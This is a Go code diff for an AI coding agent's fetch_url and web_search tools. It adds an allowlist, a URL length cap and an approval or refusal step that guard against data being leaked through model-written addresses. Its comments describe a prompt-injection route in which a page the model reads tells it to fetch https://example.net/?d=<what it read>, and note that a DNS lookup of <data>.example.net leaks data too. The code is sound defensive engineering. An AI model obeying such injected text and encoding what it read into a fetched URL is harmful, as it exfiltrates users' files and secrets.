@@ -160,11 +160,69 @@ func rawGitHub(u string) string {
 	return u
 }
 
+// maxURL is the longest address fetch_url takes. A documentation page does
+// not need more; a longer one is usually carrying something.
+const maxURL = 2000
+
+// knownPage reports whether an address may be fetched without asking: an
+// official documentation site omega knows, a result web_search returned in
+// this session, or a site the user named. The address of any other page is
+// written by the model, and what it puts there (in the path, the query or
+// the host name) is sent to whoever owns the site: after reading a file, a
+// page could tell it to fetch https://example.net/?d=<what it read>.
+func (a *Agent) knownPage(u string) bool {
+	if officialURL(u) {
+		return true
+	}
+	a.mu.Lock()
+	defer a.mu.Unlock()
+	if a.webSeen[u] {
+		return true
+	}
+	pu, err := url.Parse(u)
+	if err != nil {
+		return false
+	}
+	host := strings.TrimPrefix(strings.ToLower(pu.Hostname()), "www.")
+	return strings.Contains(host, ".") && a.userHosts[host]
+}
+
+var reUserHost = regexp.MustCompile(`(?i)\b(?:https?://)?((?:[a-z0-9-]+\.)+[a-z]{2,})\b`)
+
+// noteUserText remembers the sites a message of the user names.
+func (a *Agent) noteUserText(text string) {
+	a.mu.Lock()
+	defer a.mu.Unlock()
+	for _, m := range reUserHost.FindAllStringSubmatch(text, -1) {
+		if a.userHosts == nil {
+			a.userHosts = map[string]bool{}
+		}
+		a.userHosts[strings.TrimPrefix(strings.ToLower(m[1]), "www.")] = true
+	}
+}
+
 func toolFetchURL(ctx context.Context, a *Agent, in map[string]any) (string, error) {
 	u := getString(in, "url")
 	if !strings.HasPrefix(u, "https://") && !strings.HasPrefix(u, "http://") {
 		return "", fmt.Errorf("only http(s) URLs can be fetched")
 	}
+	if len(u) > maxURL {
+		return "", fmt.Errorf("that address is longer than %d characters; fetch the page by its plain address", maxURL)
+	}
+	// Asked before the name is even resolved: a lookup of
+	// <data>.example.net already tells example.net the data.
+	if !a.knownPage(u) {
+		if a.Mode() == ModeReadOnly || a.opts.Unattended {
+			why := "This address is not official documentation, a result of web_search in this session or a site the user named, " +
+				"and nobody can approve it in this run, so it was not fetched. Use official_docs or web_search to find the page."
+			a.emit(Event{Kind: EvDenied, Tool: "fetch_url", Command: u, Reason: why})
+			return "", explained(errors.New(why))
+		}
+		if ok, why := a.authorize(ctx, "fetch_url", u, i18n.T("agent.fetch_reason"), safety.Dangerous, false); !ok {
+			return "", explained(errors.New(why))
+		}
+	}
+	a.markTainted()
 	a.emit(Event{Kind: EvToolStart, Tool: "fetch_url", Command: u, Risk: safety.Safe})
 	body, ctype, err := get(ctx, rawGitHub(u))
 	if err != nil {
@@ -187,6 +245,7 @@ func toolWebSearch(ctx context.Context, a *Agent, in map[string]any) (string, er
 	if q == "" {
 		return "", fmt.Errorf("empty query")
 	}
+	a.markTainted()
 	a.emit(Event{Kind: EvToolStart, Tool: "web_search", Command: q, Risk: safety.Safe})
 	body, _, err := get(ctx, "https://html.duckduckgo.com/html/?q="+url.QueryEscape(q))
 	if err != nil {
@@ -204,6 +263,12 @@ func toolWebSearch(ctx context.Context, a *Agent, in map[string]any) (string, er
 			}
 		}
 		n++
+		a.mu.Lock()
+		if a.webSeen == nil {
+			a.webSeen = map[string]bool{}
+		}
+		a.webSeen[link] = true
+		a.mu.Unlock()
 		title := htmlToText(m[2])
 		if officialURL(link) {
 			title = "[official] " + title
